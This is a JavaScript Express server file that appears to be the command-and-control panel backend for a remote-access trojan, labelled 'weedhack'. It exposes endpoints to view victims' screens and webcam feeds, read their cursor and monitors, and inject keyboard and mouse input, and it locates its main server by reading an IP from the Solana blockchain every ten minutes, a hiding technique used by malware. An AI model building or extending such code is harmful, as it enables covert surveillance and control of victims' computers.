// language: JavaScript, file: server.js
import express from 'express';
import cors from 'cors';
import { startUdp, getFrame, getWebcamFrame, getCursor, getMonitors, sendInput, sendCfg } from './net.js';
import { fetchSolanaIp, getMainIp } from './discovery.js';
import path from 'node:path';
import { fileURLToPath } from 'node:url';

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const app = express();
app.use(cors());
app.use(express.json());

// ─── Local Stream Endpoints (UDP) ───────────────────────────────────────────
app.get('/api/clients/:id/screen', (req, res) => {
  const bytes = getFrame(Number(req.params.id));
  if (!bytes) return res.status(204).end();
  res.setHeader('Content-Type', 'image/webp');
  res.send(bytes);
});

app.get('/api/clients/:id/cursor', (req, res) => {
  const c = getCursor(Number(req.params.id));
  if (!c) return res.status(204).end();
  res.json(c);
});

app.get('/api/clients/:id/monitors', (req, res) => {
  res.json(getMonitors(Number(req.params.id)));
});

app.post('/api/clients/:id/input', (req, res) => {
  const ok = sendInput(Number(req.params.id), JSON.stringify(req.body));
  res.json({ ok });
});

app.post('/api/clients/:id/rdp/update', (req, res) => {
  const ok = sendCfg(Number(req.params.id), JSON.stringify(req.body));
  res.json({ ok });
});

app.get('/api/clients/:id/webcam', (req, res) => {
  const bytes = getWebcamFrame(Number(req.params.id));
  if (!bytes) return res.status(204).end();
  res.setHeader('Content-Type', 'image/jpeg');
  res.send(bytes);
});

// ─── Proxy to Main Server (Dynamic) ─────────────────────────────────────────
app.use('/api', async (req, res) => {
  const mainIp = getMainIp();
  if (!mainIp) {
    return res.status(503).json({ error: 'Main server IP not found from Solana yet' });
  }

  try {
    const url = `http://${mainIp}` + req.originalUrl;
    const fetchOpts = {
      method: req.method,
      headers: { ...req.headers, host: mainIp }
    };
    delete fetchOpts.headers['content-length'];

    if (req.method !== 'GET' && req.method !== 'HEAD') {
      fetchOpts.body = JSON.stringify(req.body);
    }

    const proxyRes = await fetch(url, fetchOpts);
    const body = await proxyRes.arrayBuffer();
    
    proxyRes.headers.forEach((value, key) => {
      if (key.toLowerCase() !== 'content-encoding') res.setHeader(key, value);
    });
    res.status(proxyRes.status).send(Buffer.from(body));
  } catch (e) {
    console.error('[proxy]', e);
    res.status(500).json({ error: 'proxy error' });
  }
});

// ─── Serve Frontend ─────────────────────────────────────────────────────────
app.use(express.static(path.join(__dirname, 'public')));

// ─── Start UDP Listener ─────────────────────────────────────────────────────
startUdp({
  host: '0.0.0.0', port: 880,
  onMsg: (text, rinfo, s) => {
    s.send(Buffer.from(`weedhack: ${text}`), rinfo.port, rinfo.address, () => {});
  },
});

// Fetch main IP on boot and then every 10 mins
fetchSolanaIp();
setInterval(fetchSolanaIp, 10 * 60 * 1000);

app.listen(3000, '0.0.0.0', () => {
  console.log(`Remote Server running on port 3000`);
  console.log(`UDP Relay running on port 880`);
});